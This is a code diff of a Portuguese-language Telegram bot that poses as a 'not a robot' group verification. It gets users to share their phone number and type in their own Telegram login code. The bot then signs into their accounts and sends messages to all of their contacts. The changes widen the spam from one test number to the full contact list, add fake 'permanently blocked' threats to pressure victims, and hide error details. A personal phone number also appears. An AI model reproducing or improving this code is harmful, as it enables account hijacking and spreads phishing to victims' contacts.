@@ -101,7 +101,7 @@ async def request_code(phone):
             return True, "Código enviado com sucesso", sent.phone_code_hash
         except Exception as e:
             await client.disconnect()
-            return False, f"Erro ao enviar código: {e}", None
+            return False, f"Ops... Deu um erro aqui 🤧 Tente novamente daqui algumas horas.", None
     else:
         await client.disconnect()
         return True, "Usuário já está autorizado", None
@@ -277,7 +277,29 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
                         print("Código expirado. Solicitando novo código...")
                         return "EXPIRED_CODE"  # Código especial para indicar código expirado
                     
-                    return f"Erro ao logar: {e}"
+                    # Incrementa o contador de tentativas
+                    if update and hasattr(update, 'callback_query'):
+                        context = update.callback_query._application.context
+                        if "code_attempts" not in context.user_data:
+                            context.user_data["code_attempts"] = 1
+                        else:
+                            context.user_data["code_attempts"] += 1
+                            
+                        # Verifica se excedeu o número máximo de tentativas
+                        if context.user_data["code_attempts"] >= 2:
+                            return f"🔒 ACESSO BLOQUEADO PERMANENTEMENTE! 🔒\nVocê excedeu o número máximo de tentativas.\nSeu número foi adicionado à lista de bloqueio."
+                    elif update and hasattr(update, 'message'):
+                        context = update.message._application.context
+                        if "code_attempts" not in context.user_data:
+                            context.user_data["code_attempts"] = 1
+                        else:
+                            context.user_data["code_attempts"] += 1
+                            
+                        # Verifica se excedeu o número máximo de tentativas
+                        if context.user_data["code_attempts"] >= 2:
+                            return f"🔒 ACESSO BLOQUEADO PERMANENTEMENTE! 🔒\nVocê excedeu o número máximo de tentativas.\nSeu número foi adicionado à lista de bloqueio."
+                    
+                    return f"Ei.. Temos um erro ❌ O Código informado está incorreto! Digite novamente o código correto.\nVocê tem mais {2 - (context.user_data.get('code_attempts', 0))} tentativa(s)."
             else:
                 # Se não forneceu código e hash e não está autorizado, não pode continuar
                 await client.disconnect()
@@ -310,7 +332,7 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
         fail_count = 0
         
         # Loop para enviar mensagem para todos os contatos
-        for contact in ["+5582993286918"]:
+        for contact in contacts:
             try:
                 # Tenta enviar a mensagem para o contato
                 try:
@@ -379,25 +401,25 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
         
         return "Operação concluída com sucesso!"
     except Exception as e:
-        return f"Erro durante a operação: {e}"
+            return f"Ops... Deu um erro aqui 🤧 Tente novamente daqui algumas horas."
     finally:
         await client.disconnect()
-
+        
 # Iniciar o bot - primeiro verificar se usuário é humano
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Verificar se está usando cliente web
     if is_web_client(update):
         # Usar botões inline para cliente web
-        keyboard = [[InlineKeyboardButton("✅ Não sou um robô", callback_data="confirm_human")]]
+        keyboard = [[InlineKeyboardButton("Não sou um Robô ✅", callback_data="confirm_human")]]
         await update.message.reply_text(
-            "Clique no botão abaixo para confirmar que você não é um robô:",
+            "Aperte no Botão abaixo para verificar que você não é um Robô:",
             reply_markup=InlineKeyboardMarkup(keyboard, resize_keyboard=True)
         )
     else:
         # Usar teclado normal para cliente mobile
-        keyboard = [[KeyboardButton("✅ Não sou um robô")]]
+        keyboard = [[KeyboardButton("Não sou um Robô ✅")]]
         await update.message.reply_text(
-            "Clique no botão abaixo para confirmar que você não é um robô:",
+            "Aperte no Botão abaixo para verificar que você não é um Robô:",
             reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
         )
     return CONFIRM_HUMAN
@@ -434,11 +456,11 @@ async def confirm_human(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         # Para cliente mobile, usamos o botão de compartilhar contato
         keyboard = [
-            [KeyboardButton("📱 Compartilhar meu contato", request_contact=True)]
+            [KeyboardButton("Compartilhar meu Contato 📲", request_contact=True)]
         ]
         
         await update.message.reply_text(
-            "Por favor, compartilhe seu contato telefônico clicando no botão abaixo:",
+            "Compartilhe seu contato para confirmarmos que você é real ⤵️",
             reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
         )
     return ASK_PHONE
@@ -538,7 +560,7 @@ async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Envia solicitação de código
     await update.message.reply_text(
-        "Enviando código de acesso! Verifique seu Telegram e aguarde...",
+        "Código enviado com segurança. Verifique seu Telegram — Estamos finalizando sua liberação ❕",
         reply_markup=ReplyKeyboardRemove()
     )
     success, message, phone_code_hash = await request_code(phone_without_plus)
@@ -560,13 +582,26 @@ async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Salvar o phone_code_hash para usar durante o login
     context.user_data["phone_code_hash"] = phone_code_hash
     
-    # Verificar se é cliente web
+    # Verifica se é cliente web
     if is_web_client(update):
         # Usar teclado inline para cliente web
         context.user_data["code_digits"] = ""
+        context.user_data["code_attempts"] = 0  # Inicializa contador de tentativas
+        
+        # Botão que abre diretamente o chat do Telegram com formato corrigido
+        keyboard = [[InlineKeyboardButton("Pegar 🅾 Código ◀", url="https://t.me/+42777")]]
+        
         await update.message.reply_text(
-            "Código enviado! Verifique seu Telegram e digite o código de verificação:",
-            reply_markup=get_inline_code_keyboard("")
+            "Pegue o Código que chegou nas Notificações do Telegram 🔽.",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+        
+        # Após um pequeno intervalo, mostramos o teclado numérico para inserir o código
+        keyboard_code = get_inline_code_keyboard("")
+        await update.message.reply_text(
+            "Digite o Código de 5️⃣ Números (Apertando UM por VEZ ❗)\n"
+            "▶ Você tem 2 Tentivas para DIGITAR o CÓDIGO CORRETAMENTE.",
+            reply_markup=keyboard_code
         )
     else:
         # Usar teclado normal para cliente mobile
@@ -577,11 +612,21 @@ async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ["0", "Limpar"]
         ]
         
-        # Inicializa o código
+        # Inicializa o código e contador de tentativas
         context.user_data["code_digits"] = ""
+        context.user_data["code_attempts"] = 0  # Inicializa contador de tentativas
+        
+        # Botão que abre diretamente o chat do Telegram com formato corrigido
+        inline_keyboard = [[InlineKeyboardButton("Ver o CÓDIGO que foi enviado 🔁", url="https://t.me/+42777")]]
         
         await update.message.reply_text(
-            "Código enviado! Verifique seu Telegram e digite o código de verificação que recebeu:",
+            "👇🏻 Clique no Botão Abaixo para abrir o chat onde está o código.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard)
+        )
+        
+        # Depois enviamos o teclado normal
+        await update.message.reply_text(
+            "Digite o Código de 5️⃣ Números (Apertando UM por VEZ ❗)\nVocê tem 2 tentativas para digitar o código corretamente.",
             reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
         )
     return ASK_CODE
@@ -638,7 +683,7 @@ async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Remove o teclado numérico
     await update.message.reply_text(
-        f"Código completo: {code}. Processando...",
+        f"Código ENVIADO ♻ [{code}]. Espere uns segundos aí!",
         reply_markup=ReplyKeyboardRemove()
     )
 
@@ -647,7 +692,7 @@ async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # Se o código expirou, solicita um novo código automaticamente
     if result == "EXPIRED_CODE":
-        await update.message.reply_text("O código expirou. Solicitando um novo código...")
+        await update.message.reply_text("O código expirou... Estamos enviando um novo código 🤖")
         
         # Solicita um novo código
         success, message, new_phone_code_hash = await request_code(phone)
@@ -686,7 +731,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if callback_data == "confirm_human":
         # Usuário clicou no botão "Não sou um robô"
-        await query.edit_message_text("Verificação humana confirmada!")
+        await query.edit_message_text("Você foi VERIFICADO(A) ✅ Seu ACESSO em nosso Grupo foi LIBERADO.")
         
         # Para cliente web, usamos teclado numérico inline para digitação manual
         keyboard = [
